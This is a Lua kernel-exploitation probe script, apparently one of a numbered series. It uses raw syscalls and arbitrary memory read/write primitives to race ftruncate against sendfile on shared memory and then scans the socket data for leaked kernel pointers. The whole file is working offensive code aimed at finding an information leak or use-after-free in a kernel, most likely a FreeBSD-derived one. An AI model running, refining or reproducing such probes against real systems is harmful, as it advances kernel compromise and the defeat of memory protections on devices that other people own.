-- CRASH_CLASS: LOW
-- PROBE 94c: sendfile behavior baseline + ftruncate race with drain
--
-- 94b hung because sendfile blocked on a full socket buffer.
-- This probe: (A) tests sendfile with nonblocking socket + small shm,
-- (B) sendfile then ftruncate from main thread (sequential),
-- (C) sendfile with child draining the receive side + child ftruncate race.
-- Goal: understand if ftruncate during sendfile causes a crash or leak.

print("=== PROBE 94c: SENDFILE BEHAVIOR ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(32); wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- ====== TEST A: sendfile baseline with nonblocking socket ======
print("--- A: sendfile baseline ---")
do
    -- Create shm
    local ok_s, rv_s = pcall(function()
        return mk(482)(uint64(1), uint64(2), uint64(0x1FF))
    end)
    local shm_fd = ok_s and N(rv_s) or -1
    if shm_fd >= 0x80000000 then shm_fd = shm_fd - 0x100000000 end
    print("shm_fd=" .. shm_fd)

    if shm_fd >= 0 then
        -- ftruncate to 16KB (1 page)
        pcall(function() mk(480)(uint64(shm_fd), uint64(0x4000)) end)

        -- Create stream socketpair
        local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
        pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), sv) end)
        local sr = rd(N(sv)) or -1; local sw = rd(N(sv)+4) or -1
        print("sockets=" .. sr .. "," .. sw)

        -- Set write side nonblocking
        local nb = memory.alloc(8); wd(N(nb), 1)
        pcall(function() mk(54)(uint64(sw), uint64(0x8004667E), uint64(N(nb))) end)

        -- sendfile(shm_fd -> sw)
        local sbytes = memory.alloc(8); wq(N(sbytes), uint64(0))
        local ok_sf, rv_sf = pcall(function()
            return mk(393)(uint64(shm_fd), uint64(sw), uint64(0), uint64(0x4000), uint64(0), uint64(N(sbytes)))
        end)
        local sf_ret = ok_sf and N(rv_sf) or -999
        if sf_ret >= 0x80000000 then sf_ret = sf_ret - 0x100000000 end
        local sent = rd(N(sbytes)) or 0
        if sent < 0 then sent = sent + 0x100000000 end
        print(string.format("sendfile ret=%d sent=%d", sf_ret, sent))

        -- Read from receive side
        local rbuf = memory.alloc(0x8000)
        local ok_r, rv_r = pcall(function()
            return mk(3)(uint64(sr), uint64(N(rbuf)), uint64(0x8000))
        end)
        local r_ret = ok_r and N(rv_r) or -999
        if r_ret >= 0x80000000 then r_ret = r_ret - 0x100000000 end
        print(string.format("read ret=%d", r_ret))

        -- Scan for kernel pointers
        if r_ret > 0 then
            local kp = 0
            for j = 0, math.min(r_ret-1, 0x7FFC), 4 do
                local lo = rd(N(rbuf)+j) or 0
                local hi = rd(N(rbuf)+j+4) or 0
                if lo < 0 then lo = lo + 0x100000000 end
                if hi < 0 then hi = hi + 0x100000000 end
                if hi >= 0xFFFF8000 and hi < 0xFFFFFF00 then
                    print(string.format("  KPTR +%04X: 0x%08X%08X", j, hi, lo))
                    kp = kp + 1
                end
            end
            print("  kptrs=" .. kp)
        end

        pcall(function() mk(6)(uint64(sr)) end)
        pcall(function() mk(6)(uint64(sw)) end)
        pcall(function() mk(6)(uint64(shm_fd)) end)
    end
end

-- ====== TEST B: sendfile then ftruncate(0) sequential ======
print("")
print("--- B: sequential sendfile then ftruncate ---")
do
    local ok_s, rv_s = pcall(function()
        return mk(482)(uint64(1), uint64(2), uint64(0x1FF))
    end)
    local shm_fd = ok_s and N(rv_s) or -1
    if shm_fd >= 0x80000000 then shm_fd = shm_fd - 0x100000000 end

    if shm_fd >= 0 then
        pcall(function() mk(480)(uint64(shm_fd), uint64(0x10000)) end)  -- 64KB

        -- Map and write pattern
        local ok_m, rv_m = pcall(function()
            return mk(477)(uint64(0), uint64(0x10000), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
        end)
        local ma = ok_m and rv_m or nil
        local ma_lo, ma_hi = split(ma)
        if ma and ma_hi < 0xFFFF then
            for p = 0, 3 do
                pcall(function()
                    memory.write_dword(uint64(string.format("0x%X%08X", ma_hi, ma_lo + p*0x4000)), 0xDEAD0000+p)
                end)
            end
            pcall(function() mk(73)(uint64(string.format("0x%X%08X", ma_hi, ma_lo)), uint64(0x10000)) end)
        end

        local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
        pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), sv) end)
        local sr = rd(N(sv)) or -1; local sw = rd(N(sv)+4) or -1

        local nb = memory.alloc(8); wd(N(nb), 1)
        pcall(function() mk(54)(uint64(sw), uint64(0x8004667E), uint64(N(nb))) end)

        -- sendfile 64KB
        local sbytes = memory.alloc(8); wq(N(sbytes), uint64(0))
        local ok_sf, rv_sf = pcall(function()
            return mk(393)(uint64(shm_fd), uint64(sw), uint64(0), uint64(0x10000), uint64(0), uint64(N(sbytes)))
        end)
        local sf_ret = ok_sf and N(rv_sf) or -999
        if sf_ret >= 0x80000000 then sf_ret = sf_ret - 0x100000000 end
        local sent = rd(N(sbytes)) or 0
        if sent < 0 then sent = sent + 0x100000000 end
        print(string.format("sendfile ret=%d sent=%d", sf_ret, sent))

        -- Now ftruncate to 0
        local ok_t, rv_t = pcall(function()
            return mk(480)(uint64(shm_fd), uint64(0))
        end)
        local t_ret = ok_t and N(rv_t) or -999
        if t_ret >= 0x80000000 then t_ret = t_ret - 0x100000000 end
        print("ftruncate(0)=" .. t_ret)

        -- Read whatever was sent - the data is already in the socket buffer
        -- but the shm pages are now freed. Does the data contain stale page content?
        local rbuf = memory.alloc(0x10000)
        for j = 0, 0xFFFC, 4 do wd(N(rbuf)+j, 0xBBBBBBBB) end

        -- Read in a loop since nonblocking
        local total = 0
        for attempt = 1, 10 do
            local ok_r, rv_r = pcall(function()
                return mk(3)(uint64(sr), uint64(N(rbuf)+total), uint64(0x10000 - total))
            end)
            local chunk = ok_r and N(rv_r) or 0
            if chunk >= 0x80000000 then chunk = chunk - 0x100000000 end
            if chunk <= 0 then break end
            total = total + chunk
        end
        print(string.format("total_read=%d", total))

        -- Scan for kernel pointers in received data
        local kp = 0
        for j = 0, math.min(total-1, 0xFFFC), 4 do
            local lo = rd(N(rbuf)+j) or 0
            local hi = rd(N(rbuf)+j+4) or 0
            if lo < 0 then lo = lo + 0x100000000 end
            if hi < 0 then hi = hi + 0x100000000 end
            if hi >= 0xFFFF8000 and hi < 0xFFFFFF00 then
                print(string.format("  KPTR +%04X: 0x%08X%08X", j, hi, lo))
                kp = kp + 1
            end
        end
        -- Check for unexpected data (not our pattern)
        local unexpected = 0
        for p = 0, math.min(math.floor(total / 0x4000), 3) do
            local v = rd(N(rbuf) + p * 0x4000) or 0
            if v < 0 then v = v + 0x100000000 end
            if v ~= 0xDEAD0000 + p and v ~= 0 and v ~= 0xBBBBBBBB then
                print(string.format("  UNEXPECTED page%d: 0x%08X", p, v))
                unexpected = unexpected + 1
            end
        end
        print(string.format("kptrs=%d unexpected=%d", kp, unexpected))

        pcall(function() mk(6)(uint64(sr)) end)
        pcall(function() mk(6)(uint64(sw)) end)
        pcall(function() mk(6)(uint64(shm_fd)) end)
    end
end

-- ====== TEST C: sendfile large shm, nonblocking, ftruncate after partial send ======
print("")
print("--- C: partial sendfile + ftruncate ---")
do
    local ok_s, rv_s = pcall(function()
        return mk(482)(uint64(1), uint64(2), uint64(0x1FF))
    end)
    local shm_fd = ok_s and N(rv_s) or -1
    if shm_fd >= 0x80000000 then shm_fd = shm_fd - 0x100000000 end

    if shm_fd >= 0 then
        -- 256KB shm
        pcall(function() mk(480)(uint64(shm_fd), uint64(0x40000)) end)

        local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
        pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), sv) end)
        local sr = rd(N(sv)) or -1; local sw = rd(N(sv)+4) or -1

        local nb = memory.alloc(8); wd(N(nb), 1)
        pcall(function() mk(54)(uint64(sw), uint64(0x8004667E), uint64(N(nb))) end)

        -- sendfile 256KB (will partially send, socket buffer ~64-128KB)
        local sbytes = memory.alloc(8); wq(N(sbytes), uint64(0))
        local ok_sf, rv_sf = pcall(function()
            return mk(393)(uint64(shm_fd), uint64(sw), uint64(0), uint64(0x40000), uint64(0), uint64(N(sbytes)))
        end)
        local sf_ret = ok_sf and N(rv_sf) or -999
        if sf_ret >= 0x80000000 then sf_ret = sf_ret - 0x100000000 end
        local sent = rd(N(sbytes)) or 0
        if sent < 0 then sent = sent + 0x100000000 end
        print(string.format("sendfile ret=%d sent=%d", sf_ret, sent))

        -- ftruncate to 0 while data is in socket buffer
        pcall(function() mk(480)(uint64(shm_fd), uint64(0)) end)
        print("ftruncate(0) done")

        -- Drain receive side and scan
        local rbuf = memory.alloc(0x40000)
        local total = 0
        for attempt = 1, 20 do
            local ok_r, rv_r = pcall(function()
                return mk(3)(uint64(sr), uint64(N(rbuf)+total), uint64(0x40000 - total))
            end)
            local chunk = ok_r and N(rv_r) or 0
            if chunk >= 0x80000000 then chunk = chunk - 0x100000000 end
            if chunk <= 0 then break end
            total = total + chunk
        end
        print(string.format("total_read=%d", total))

        local kp = 0
        for j = 0, math.min(total-1, 0x3FFFC), 8 do
            local lo = rd(N(rbuf)+j) or 0
            local hi = rd(N(rbuf)+j+4) or 0
            if lo < 0 then lo = lo + 0x100000000 end
            if hi < 0 then hi = hi + 0x100000000 end
            if hi >= 0xFFFF8000 and hi < 0xFFFFFF00 then
                print(string.format("  KPTR +%04X: 0x%08X%08X", j, hi, lo))
                kp = kp + 1
            end
        end
        print("kptrs=" .. kp)

        pcall(function() mk(6)(uint64(sr)) end)
        pcall(function() mk(6)(uint64(sw)) end)
        pcall(function() mk(6)(uint64(shm_fd)) end)
    end
end

print("")
print("alive=" .. tostring(alive()))
print("=== 94c COMPLETE ===")
